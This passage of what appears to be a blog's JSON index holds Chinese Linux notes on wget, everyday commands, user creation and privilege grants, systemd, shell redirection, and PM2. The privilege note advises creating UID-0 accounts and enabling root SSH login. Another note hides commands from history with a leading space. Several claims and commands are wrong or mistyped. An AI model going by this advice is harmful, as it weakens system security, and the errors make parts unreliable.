sshd_config 参考手册","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"}]},{"title":"Wget 使用技巧","slug":"wget-tips","date":"2020-07-16T15:30:39.000Z","updated":"2020-07-16T15:31:23.790Z","comments":true,"path":"wget-tips/","link":"","permalink":"https://www.0x2beace.com/wget-tips/","excerpt":"wget 是一个命令行的下载工具，对于经常使用Linux的用户来说，真是再熟悉不过了。下面总结了一些实用的wget使用技巧，可能会让你更加高效地使用 wget。","text":"wget 是一个命令行的下载工具，对于经常使用Linux的用户来说，真是再熟悉不过了。下面总结了一些实用的wget使用技巧，可能会让你更加高效地使用 wget。 重命名最常见的使用方式： 1$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt wget默认会以最后一个符合 / 的后面的字符来对下载文件命名，对于动态链接的下载通常文件名会不正确。 如果希望对这个下载的文件进行重命名，我们可以使用参数 -O 来指定一个文件名： 1$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt 后台下载当需要下载比较大的文件时，使用参数 -b 可以隐藏在后台进行下载： 1$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg 然后可以使用以下命令查看当前的进度： 1$ tail -f wget-log 下载目录这条命令可以下载 http://example.com 网站上 packages 目录中的所有文件。 参数说明： -r：下载目录 -np：不遍历父目录 -nd：不在本机重新创建目录结构 1$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F; 与上一条命令相似，但多加了一个 --accept=iso 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。 1$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F; 批量下载此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。 1$ wget -i filename.txt 断点续传通常我们在下载大文件时，为了防止中途因为网络不稳定等因素所引起的下载失败，可以使用 -c 参数，作为断点续传。 好处是：如果当时下载失败了，之后再次下载该文件时，会继续上一次的下载，而不用重头下载了。 1$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso 其他该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项 1$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F; 参考链接 wget 使用技巧","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"一些实用的 Linux 命令","slug":"some-practical-linux-commands","date":"2020-07-16T15:26:13.000Z","updated":"2020-09-05T02:10:46.310Z","comments":true,"path":"some-practical-linux-commands/","link":"","permalink":"https://www.0x2beace.com/some-practical-linux-commands/","excerpt":"这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。","text":"这篇笔记的目的是用来整理那些不常用但又很实用的Linux 命令。 sudo !!有时候我们好不容易输完一长串命令，却被提示”权限不足”，如果这个时候有一个命令记住上一次的输入内容那该多好。 还真有，!!命令可以获取最后一次输入的命令，所以我们直接输入下面这个命令就可以了。 1$ sudo !! 注意中间有一个空格。 nlnl 命令类似cat命令，都是查看文件内容，但不同之处在于：nl命令会在文本内容的每一行前面，添加行号。 123456$ cat test.txtboomac$ nl test.txt1. boo2. mac tree以树状的形式返回当前目录的文件夹结构，这个命令很好用。 12345$ tree .└── test.txt0 directories, 1 file pstree和tree类似，不过它是返回当前运行的所有进程及其相关的子进程的树状结构。 1234$ pstree | grep php|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off; | \\--- 01410 boo nginx: worker process | | \\--- 73098 boo grep --color&#x3D;auto nginx dig这个命令特别实用，可以用来查看域名解析情况。 123456789101112131415dig 0x2BeAce.com +nostats +nocomments +nocmd; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd;; global options: +cmd;0x2BeAce.com. IN A0x2BeAce.com. 3581 IN A 185.199.108.1530x2BeAce.com. 3581 IN A 185.199.110.1530x2BeAce.com. 3581 IN A 185.199.111.1530x2BeAce.com. 3581 IN A 185.199.109.1530x2BeAce.com. 3581 IN NS ns12.domaincontrol.com.0x2BeAce.com. 3581 IN NS ns11.domaincontrol.com.ns12.domaincontrol.com. 59833 IN A 173.201.73.6ns11.domaincontrol.com. 92984 IN A 97.74.105.6ns12.domaincontrol.com. 146699 IN AAAA 2603:5:2290::6ns11.domaincontrol.com. 92042 IN AAAA 2603:5:2190::6 &lt;空格&gt; 命令这是一个有趣的命令，总所周知，用户在终端上键入的每一个命令都会被记录到history中，那么有没有一个命令可以骗过history，而不被记入呢？答案是有的。 在终端，只需要在键入命令之前输入一个或多个空格，这样你的命令就不会被记录了。 123456$ hisotry8874 pstree | grep nginx$ date2020年 5月18日 星期一 21时09分03秒 CST$ history8874 pstree | grep nginx 一些其他命令查看系统信息 1$ uname -a 查找发行版信息 1$ lsb_release -a 查看当前日期 1$ date 立即关机 1$ shutdown -h now 重新启动 1$ reboot 输出文件类型信息 12$ file test.txttest.txt: ASCII text 在终端中进行简单的算数运算 12$ expr 1 + 34 重命名文件 123$ mv fileA.txt fileB.txt$ lsfileB.txt nohup 是一个 POSIX 命令，用于忽略 SIGHUP 。 SIGHUP信号是終端注销时所发送至程序的一个信号。 1nohub php script.php type 命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。 123type -a phpphp is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;phpphp is &#x2F;usr&#x2F;bin&#x2F;php 命令类型： alias：别名。 keyword：关键字，Shell保留字。 function：函数，Shell函数。 builtin：内建命令，Shell内建命令。 file：文件，磁盘文件，外部命令。 unfound：没有找到。 查找进程 1ps -aux | grep php 注意：每个操作系统的ps版本略有不同，Ubuntu 和Mac 上可以直接使用-aux参数，但可能其他系统不能加破折号。参考链接：Linux ps command help and example 杀死进程 根据 pid（会杀死指定pid 的进程） 1kill -9 [pid] 根据进程名称（会杀死一组同名进程） 1killall php 全局根据文件名查找文件具体路径有时候很想找到某个文件，但是又不记得具体路径了，这时可以使用 find 命令： 1find &#x2F; -name &lt;file name&gt; 参考链接 鲜为人知而又实用的 Linux 命令","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"命令整理","slug":"Linux/命令整理","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux 添加用户以及权限分配","slug":"linux-add-users-and-assign-permissions","date":"2020-07-15T15:19:14.000Z","updated":"2020-07-16T15:29:23.772Z","comments":true,"path":"linux-add-users-and-assign-permissions/","link":"","permalink":"https://www.0x2beace.com/linux-add-users-and-assign-permissions/","excerpt":"写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。 另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。","text":"写这篇笔记的目的是：在 Linux 下经常为用户的权限问题而头疼，要么是权限不足，要么是权限太大，导致结果往往不是自己想要的。 另外还有一个促使我写这篇笔记的原因就是：之前在 本地的 Ubuntu 上，竟然把用户玩坏了… 为了避免这种事情在服务器上发生，还是得深入研究下这一块。 添加用户在 Linux 上，添加用户有两种方式：useradd和adduser，其区别就是： useradd 是一个Linux 命令，它提供很多参数给用户根据自己的需要进行设置。 adduser 则是一个perl 脚本，在使用时通过简单的人机交互界面，供用户进行个性设置。 adduser相比 useradd，adduser的使用要简单很多。 使用adduser 添加一个用户： 1$ adduser boo 然后根据提示填写相应的内容，需要注意的是，该命令会自动的在 /home 目录下创建一个与用户同名的目录。 用 adduser 这个命令创建的账号是系统账号，可以用来登录到 ubuntu系统。 useradduseradd 命令有大量的参数供我们进行个性设置，常用参数如下： -d&lt;登入目录&gt;：指定用户登入时的启始目录，并赋予用户对该目录的的完全控制权\u001c -g&lt;群组&gt;：指定用户所属的群组； -G&lt;群组&gt;：指定用户所属的附加群组； -m：在 /home 目录下自动建立用户的登入目录； -r：建立系统帐号； -s：指定用户登入后所使用的shell； -u：指定用户的 id 使用 useradd 创建用户的一般步骤如下： 1234$ useradd -m boo -s &#x2F;bin&#x2F;bash$ passwd boo$ ls &#x2F;home&#x2F;boo 其中要注意的有： useradd 命令如果不带任何参数（useradd boo），表示只是创建一个用户，既没有 /home 目录下的同名文件夹，也没有设置密码，但是可以在 /etc/passwd 文件的最后一行看到刚才添加的用户。 useradd 这个命令创建的是普通账号，并不能用来登录系统。加上参数-r，将该用户加入到系统用户，系统用户为 id在 1000以下的用户，而普通用户则是id 在 1000以上。事实证明 无论是普通用户还是系统用户 只要密码输入正确都能登入系统。 当使用参数-m的时候，系统会自动地在 /home 目录下建立一个与新建用户同名的用户主文件夹；如果不使用-m的话，那么就默认是使用-M参数，不创建主文件夹，即使你使用了-d这个参数。所以如果想要自己选择主文件夹，需要同时加上-m和-d参数。 误区：很都时候刚拿到一台新的机器，会发现用户目录下只有一个当前用户的文件夹，不要误以为该系统只有你一个用户，是因为很多系统用户的主目录并不在 /home 下。 权限分配提权无论是使用 adduser 还是 useradd 创建的用户，都试着执行一下以下命令： 1$ sudo apt-get install vim 不出意外，你肯定会得到这样一个错误： 12[sudo] password for boo:boo is not in the sudoers file. This incident will be reported. 这个错误的意思是说该用户并不在 sudoers 文件中，那么该如何解决呢？ 使用如下命令： 1234567$ sudo visudo# Members of the admin group may gain root privileges%admin ALL&#x3D;(ALL) ALL# 找到该注释，在其下增加一行 %yourusername ALL&#x3D;(ALL) ALL 然后保存退出，就会发现可以使用 sudo 提权了。 赋予 root 权限这里有三种方式，先来看看最简单的方式： 方式一： 1234$ sudo vim &#x2F;etc&#x2F;passwd# 将用户id 改为 0testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh 需要注意的是： 该方法适用于普通用户以及管理员用户 使用 testuser1 账户登录后，直接获取的就是 root 帐号的权限。 方式二：（这里以ubuntu 系统为例） 1234567$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# Allow members of group sudo to execute any command%sudo ALL&#x3D;(ALL:ALL) ALL# 在其后面增加一行%wheel ALL&#x3D;(ALL:ALL) ALL 然后修改该用户，使其属于 root 组（wheel）： 1$ usermod -g root boo 修改完成之后，使用boo 用户登入，执行命令：su -，输入 root 账户的密码，即可获得root 权限。 方式三：（这里以ubuntu 为例） 12345$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# User privilege specificationroot ALL&#x3D;(ALL:ALL) ALLboo ALL&#x3D;(ALL:ALL) ALL 修改完成之后，使用boo 用户登入，执行命令：su -，输入 root 账户的密码，即可获得root 权限。 方式二、方式三和方式一的区别就是：前者需要知道root 账户的密码，而后者可以直接以普通用户的身份或者管理员身份获取root 权限。 另外还有一个需要注意的地方就是：使用第一种方式获取 root 权限，其实也有弊端，弊端就是 远程使用该用户登入时，还是需要输入 root 密码，才能验证身份成功，是的 必须输入 root 用户的密码。 事实证明，并非上面所述，ssh 连接时的确需要输入密码验证，但不是 root 用户的密码，之前之所以一直看到 Permission denied, please try again.这样的错误，只是因为 没有开启允许 root 用户远程登入的权限。如何开启，见下文扩展补充。 扩展补充在Ubuntu中如何修改 root 密码默认情况下，出于安全原因，root用户帐户密码在Ubuntu Linux 中被锁定。因此，无法使用root用户登录或使用诸如su -之类的命令成为超级用户。 但可以借助其他方式，使用passwd命令来修改。因为普通用户只能更改其帐户的密码。超级用户（root）可以更改任何用户帐户的密码（包括它自己）。 使用以下命令成为 root用户： 12$ sudo -i$ passwd root 如果在sudo 命令使用不了的情况下，可以进入单用户模式，再进行修改 1$ passwd root 在Ubuntu中如何远程 root 登入在Ubuntu中，默认是不能使用 root 账户登入到系统的，如果一定想要用 root账户登入，可以编辑 sshd 配置，执行如下操作： 12345678$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# PermitRootLogin prohibit-password# 修改为：# PermitRootLogin yes# 重启sshd 服务$ sudo systemctl restart sshd 参考链接 adduser 和 useradd 的区别 Ubuntu 如何进入单用户模式 ssh-如何远程以root 登入 如何在Ubuntu Linux 中更改 root 密码 如何使用su / sudo成为Ubuntu Linux的超级用户？ Ubuntu Linux root 用户默认密码","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux init、service、systemctl 三者区别","slug":"the-difference-between-linux-init-service-systemctl","date":"2020-07-14T15:38:00.000Z","updated":"2020-12-12T05:46:24.839Z","comments":true,"path":"the-difference-between-linux-init-service-systemctl/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/","excerpt":"在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是init、service、systemctl。 至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。","text":"在接触到Linux 的服务之后，我所知道的管理服务的方式有三种，分别是init、service、systemctl。 至于这三者之间的区别不得而知，所以整理这片笔记的目的就是了解这三者之间的区别。 init历史上，Linux 的启动一直采用init 进程。 在类Unix 的计算机操作系统中，Init（初始化的简称）是在启动计算机系统期间启动的第一个进程。 Init 是一个守护进程，它将持续运行，直到系统关闭。它是所有其他进程的直接或间接的父进程。 因为init 的参数全在/etc/init.d目录下，所以使用 init 启动一个服务，应该这样做： 1$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start service通过查看man 手册页可以得知，service是一个运行System V init的脚本命令。 那么什么是 System V init 呢？ 也就是/etc/init.d 目录下的参数。 所以分析可知service 是去/etc/init.d目录下执行相关程序，服务配置文件的存放目录就是/etc/init.d. 使用 service 启动一个服务 1$ service nginx start 可以理解成 service 就是init.d 的一种实现方式。所以这两者启动方式（或者是停止、重启）并没有什么区别。 123$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start&#x2F;&#x2F; 等价于$ service nginx start 但是这两种方式均有如下缺点： 启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。 启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。 systemdSystemd 就是为了解决这些问题而诞生的。它包括 System and Service Manager，为系统的启动和管理提供一套完整的解决方案。Systemd 是Linux 系统中最新的初始化系统（init），它主要的设计目的是克服 System V init固有的缺点，提高系统的启动速度。 根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。 使用了 Systemd，就不需要再用init 了。Systemd 取代了initd（Initd 的PID 是0） ，成为系统的第一个进程（Systemd 的PID 等于 1），其他进程都是它的子进程。 Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。 查看Systemd 的版本信息 1$ systemctl --version 系统管理Systemd 并不是一个命令，而是一组命令，涉及到系统管理的方方面面。 systemctlsystemctl是 Systemd 的主命令，用于管理系统。 12345678&#x2F;&#x2F; 重启系统$ sudo systemctl reboot&#x2F;&#x2F; 启动进入救援状态（单用户状态）$ sudo systemctl rescue&#x2F;&#x2F; 管理服务$ sudo systemctl start nginx hostnamectlhostnamectl命令用于查看当前主机的信息。 12345&#x2F;&#x2F; 显示当前主机信息$ hostnamectl&#x2F;&#x2F; 设置主机名$ sudo hostnamectl set-hostname BoodeUbuntu localectllocalectl命令用于查看本地化设置。 123456&#x2F;&#x2F; 查看本地化设置$ localectl&#x2F;&#x2F; 设置本地化参数。$ sudo localectl set-locale LANG&#x3D;en_GB.utf8$ sudo localectl set-keymap en_GB timedatectltimedatectl命令用于查看当前时区设置。 12345678910&#x2F;&#x2F; 查看当前时区设置$ timedatectl&#x2F;&#x2F; 显示所有可用的时区$ timedatectl list-timezones &#x2F;&#x2F; 设置当前时区$ sudo timedatectl set-timezone America&#x2F;New_York$ sudo timedatectl set-time YYYY-MM-DD$ sudo timedatectl set-time HH:MM:SS 总结 init 是最初的进程管理方式 service 是init 的另一种实现 systemd 则是一种取代 initd 的解决方案 其中 systemctl 是 systemd 的主命令，用于管理系统以及服务。 参考链接 Linux Init - 维基百科 Systemd 入门教程 - 阮一峰的网络日志 init、service、systemctl 的区别 Linux 守护进程的启动方式","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"了解 Linux的管道符、重定向、环境变量","slug":"understand-linux-pipe-symbols-redirects-environment-variables","date":"2020-07-13T15:48:12.000Z","updated":"2020-07-14T15:49:18.916Z","comments":true,"path":"understand-linux-pipe-symbols-redirects-environment-variables/","link":"","permalink":"https://www.0x2beace.com/understand-linux-pipe-symbols-redirects-environment-variables/","excerpt":"这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。","text":"这篇文章浅谈一下 Linux 的管道符、重定向和环境变量。 输入输出重定向在了解什么是输入输出重定向之前，我们先要搞清楚以下两种输出信息的区别： 标准输出信息：包括该文件的一些相关权限、所有者、所属组、文件大小及修改时间等信息。 错误输出信息：Bash终端显示的报错提示信息123456[max@localhost 桌面]$ lstestdir test.txt[max@localhost 桌面]$ cat test.txtHello Linux! # 标准输出信息[max@localhost 桌面]$ cat xxxcat: xxx: 没有那个文件或目录 # 错误输出信息 因为不存在xxx文件 标准输入重定向（STDIN，文件描述符为0）：默认从键盘输入，也可从其他文件或命令中输入。 标准输出重定向（STDOUT，文件描述符为1）：默认输出到屏幕。 错误输出重定向（STDERR，文件描述符为2）：默认输出到屏幕。 之所以花这么大力气，理解这个概念，是因为待会有个很重要的知识点要用到这个概念。 输出重定向123456命令 &gt; 文件 将标准输出重定向到一个文件中（清空原有文件的数据）命令 2&gt; 文件 将错误输出重定向到一个文件中（清空原有文件的数据）命令 &gt;&gt; 文件 将标准输出重定向到一个文件中（追加到原有内容的后面）命令 2&gt;&gt; 文件 将错误输出重定向到一个文件中（追加到原有内容的后面）命令 &gt;&gt; 文件 2&gt;&amp;1 或命令 &amp;&gt;&gt; 文件 将标准输出与错误输出共同写入到文件中（追加到原有内容的后面） 实例： 12345678910[max@localhost 桌面]$ cat test.txtHello Linux![max@localhost 桌面]$ echo &quot;测试输出重定向(追加模式)&quot; &gt;&gt; test.txt[max@localhost 桌面]$ cat test.txt Hello Linux!测试输出重定向(追加模式)[max@localhost 桌面]$ echo &quot;测试输出重定向(清除模式)&quot; &gt; test.txt[max@localhost 桌面]$ cat test.txt测试输出重定向(清除模式) 输入重定向123命令 &lt; 文件 将文件作为命令的标准输入命令 &lt;&lt; 分界符 从标准输入中读入，直到遇见分界符才停止命令 &lt; 文件1 &gt; 文件2 将文件1作为命令的标准输入并将标准输出到文件2 输入重定向相对于输出重定向较使用的少一些，可以理解为：输入重定向的作用是把文件直接导入到命令中。例子： 123# 将文件text.txt导入给 &#96;wc -l&#96;命令，统计行数。[max@localhost 桌面]$ wc -l &lt; test.txt1 管道符管道符的概念就是：把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。 举个例子，把etc目录下的所有文件的属性信息，作为标准输入传递给 more命令。 12345678[max@localhost 桌面]$ ls -l &#x2F;etc&#x2F; | more总用量 1396drwxr-xr-x. 3 root root 97 8月 24 04:35 abrt-rw-r--r--. 1 root root 16 8月 24 04:43 adjtime-rw-r--r--. 1 root root 21929 1月 29 2014 brltty.confdrwxr-xr-x. 2 root root 6 1月 29 2014 chkconfig.d-rw-r--r--. 1 root root 1157 2月 6 2014 chrony.conf--More-- 命令行中的通配符 星号（*）代表匹配零个或多个字符 问号（?）代表匹配单个字符 中括号内加上数字[0-9]代表匹配0～9之间的单个数字的字符 而中括号内加上字母[abc]则是代表匹配a、b、c三个字符中的任意一个字符123456789101112131415161718[max@localhost test]$ lsfile1 file2 file3 file99 filex[max@localhost test]$ ls -l file?-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2-rw-rw-r--. 1 max max 0 10月 10 22:49 file3-rw-rw-r--. 1 max max 0 10月 10 22:49 filex[max@localhost test]$ ls -l file*-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2-rw-rw-r--. 1 max max 0 10月 10 22:49 file3-rw-rw-r--. 1 max max 0 10月 10 22:49 file99-rw-rw-r--. 1 max max 0 10月 10 22:49 filex[max@localhost test]$ ls -l file[1-2]-rw-rw-r--. 1 max max 0 10月 10 22:49 file1-rw-rw-r--. 1 max max 0 10月 10 22:49 file2[max@localhost test]$ ls -l file[x]-rw-rw-r--. 1 max max 0 10月 10 22:49 filex 常用的转义字符 反斜杠（\\）：使反斜杠后面的一个变量变为单纯的字符串。 单引号（’’）：转义其中所有的变量为单纯的字符串。 双引号（””）：保留其中的变量属性，不进行转义处理。 反引号（``）：把其中的命令执行后返回结果。 123[max@localhost test]$ PRICE&#x3D;5[max@localhost test]$ echo &quot;The price of this shirt is $PRICE&quot;The price of this shirt is 5 上面的输出看上去挺对的，但是并不完美，我们希望能够输出“The price of this shirt is $5”，于是我们试着这样写： 12[max@localhost test]$ echo &quot;The price of this shirt is $$PRICE&quot;The price of this shirt is 9944PRICE 不幸的是美元符号和变量提取符号合并后$$作用是显示当前程序的进程ID。 要想让第一个$乖乖地作为美元符号，那么就需要使用反斜杠\\来进行转义，将这个命令提取符转义成单纯的文本，去除其特殊功能。 12[max@localhost test]$ echo &quot;The price of this shirt is \\$$PRICE&quot;The price of this shirt is $5 如果只需要某个命令的输出值时，可以像命令这样，将命令用反引号括起来，达到预期的效果. 123[max@localhost test]$ echo &#96;uname -a&#96; &gt;&gt; file1[max@localhost test]$ cat file1Linux localhost.localdomain 3.10.0-123.el7.x86_64 #1 SMP Mon May 5 11:16:57 EDT 2014 x86_64 x86_64 x86_64 GNU&#x2F;Linux 思考：如何将普通变量转换为全局变量？ 使用命令：export [变量名称]，需要在拥有管理员权限时才能正常使用。 12345678910111213141516[root@localhost home]# WORKDIR&#x3D;&#x2F;home&#x2F;workdir[root@localhost home]# mkdir $WORKDIR [root@localhost home]# cd $WORKDIR[root@localhost workdir]# pwd&#x2F;home&#x2F;workdir[root@localhost workdir]# exitexit[max@localhost home]$ cd $WORKDIR[max@localhost ~]$ echo $WORKDIR[max@localhost ~]$ su root密码：[root@localhost max]# export WORKDIR[root@localhost &#x2F;]# su max[max@localhost &#x2F;]$ cd $WORKDIR[max@localhost workdir]$ pwd&#x2F;home&#x2F;workdir 重点一：在上面的命令中有一个很重要的知识点： 关于如何在Linux中创建一个变量的问题？有两个地方需要注意。 所有字母都需要大写 变量与赋值符号(=)之间不能存在空格 无论是系统环境变量还是自定义变量还是全局变量，在调用时 都需要使用$符号来标识。 重点二 在Linux 系统中当普通用户身份时命令提示符的前缀标识是：$。 在Linux 系统中当为管理员身份时命令提示符的前缀标识是：#。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"学习笔记","slug":"Linux/学习笔记","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"PM2 快速上手","slug":"pm2-quick-start","date":"2020-07-12T13:44:47.000Z","updated":"2020-09-04T13:54:47.036Z","comments":true,"path":"pm2-quick-start/","link":"","permalink":"https://www.0x2beace.com/pm2-quick-start/","excerpt":"PM2 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。","text":"PM2 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。 安装 1$ npm install pm2 -g 无缝更新 1$ pm2 update 启动应用PM2 中有两种方式启动应用，一种是直接调用应用入口文件，一种是通过调用配置文件启动应用。 命令行启动在生产环境中，通过命令行启动服务 1$ pm2 stat app.js 配置文件启动很多时候，仅仅只是使用 PM2 去启动应用，可能不能完全满足我们的需求。 当需要对应用有更多的要求时，这个时候就需要用到PM2 的配置文件了。 PM2 支持通过配置文件创建管理应用，首先在项目根目录手动创建配置文件precesses.json： 12345678910&#123; &quot;apps&quot;: [ &#123; &quot;name&quot;: &quot;myApp&quot;, &quot;cwd&quot;: &quot;&#x2F;var&#x2F;www&#x2F;app&#x2F;&quot;, &quot;script&quot;: &quot;.&#x2F;app.js&quot;, &quot;watch&quot;: true &#125; ]&#125; 或者直接使用 pm2 init 命令，自动创建默认的ecosystem.config.js配置文件： 1234567module.exports &#x3D; &#123; apps : [&#123; name: &quot;myApp&quot;, script: &#39;index.js&#39;, watch: &#39;.&#39; &#125;&#125;; 这两种方式都可以创建管理应用，作用都是一样的，区别只是：一个是json格式的配置文件，一个是js格式的配置文件。 上面是一个最简单的processes.json配置，创建了一个myApp应用，如果你有多个服务，那么apps 这个数组中创建多个应用。 创建好配置文件之后，那么该如何启动呢？ 有两种方式： 直接调用配置文件启动 1$ pm2 start processes.json 可以增加--env参数，来指定当前启动环境。 通过package.json 配置文件，配置脚本启动 123456&#x2F;&#x2F; package.json&quot;scripts&quot;: &#123; &quot;start&quot;: &quot;node server&#x2F;index&quot;, &quot;pm2&quot;: &quot;pm2 start processes.json&quot; &#125; 然后就可以直接使用npm start pm2 来启动应用了。 参数说明在配置文件你可以指定环境变量、日志文件、进程文件，重启最大次数…等配置项。支持JSON和YAML格式。 PM2 的配置支持非常多的参数，下面会对常用的参数一一做说明。 字段 类型 值 描述 name string myApp 应用的名字，默认是脚本文件名 cwd string /var/www/myApp 应用程序所在目录 script string ./server.js 应用程序的脚本路径，相对于应用程序所在目录 log_date_format string YYYY-MM-DD HH:mm Z 日志时间格式 error_file string - 错误日志存放路径 out_file string - 输出日志存放路径 pid_file string - pid文件路径 watch boolean or array true 当目录文件或子目录文件有变化时自动重新加载应用 ignore_watch list [”[/]./”, “node_modules”] list中的正则匹配的文件和目录有变化时不重新加载应用 max_memory_restart string 50M 当应用超过设定的内存大小就自动重启 min_uptime string 60s 最小运行时间，这里设置的是60s即如果应用程序在60s内退出，pm2会认为程序异常退出，此时触发重启max_restarts设置数量 max_restarts number 10 设置应用程序异常退出重启的次数，默认15次（从0开始计数） instances number 1 启动实例个数 cron_restart string 1 0 * * * 定时重启 exec_interpreter string node 应用程序的脚本类型，默认是node exec_mode string fork 应用启动模式，支持fork和cluster模式，默认为fork autorestart boolean true 应用程序崩溃或退出时自动重启 有以下几点需要注意 ⚠️： 如果processes.json或者ecosystem.config.js 配置文件如果发生了变化，建议直接删除应用之后，重新创建，否则可能部分配置不会生效。 cwd 不要填绝对路径，建议用相对路径，./表示相对于配置文件根目录，否则可能会出现静态资源丢失的情况。 进程监控列出所有节点应用程序（进程/微服务） 12$ pm2 list$ pm2 ls 可以将进程列表以JSON格式打印出来： 12$ pm2 jlist$ pm2 prettylist 使用进程ID或名称查看所示的单个Node进程的详细信息： 12$ pm2 describe &lt;id | app_name&gt;$ pm2 show &lt;id | app_name&gt; 实时监控所有进程CPU或内存使用情况： 1$ pm2 monit 日志管理查看某个应用的日志： 1$ pm2 logs [&#39;all&#39; | app_name | app_id ] 1234$ pm2 logs --json # JSON 格式输出$ pm2 logs --format # 格式化 output$ pm2 flush # 清空所有日志文件$ pm2 reloadLogs # 重新加载所有日志文件 常用命令停止进程 1$ pm2 stop [&#39;all&#39; | app_name | app_id ] 重启进程 1$ pm2 restart [&#39;all&#39; | app_name | app_id ] 0秒停机重载进程 (用于 NETWORKED 进程) 1$ pm2 reload all 杀死进程 1$ pm2 delete [&#39;all&#39; | app_name | app_id ] 使用PM2 运行 npm startnpm run xxxx 是 node常用的启动方式之一，那么如何使用PM2来实现对该方式的启动呢？ npm run、npm start等命令之所以可以使用，是因为package.json配置文件中增加了对应的脚本命令。 1234&quot;scripts&quot;: &#123; &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;, &quot;start&quot;: &quot;node server&#x2F;index&quot;, &#125; 语法： 1pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;; 其中 --watch监听代码变化，--name重命名任务名称，-- run后面跟脚本名字 实例： 12&#x2F;&#x2F; 等效于 npm startpm2 start npm --watch --name webserver -- run start 稳定运行PM2 是一款非常优秀的 Node 进程管理工具，它有着丰富的特性，能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster 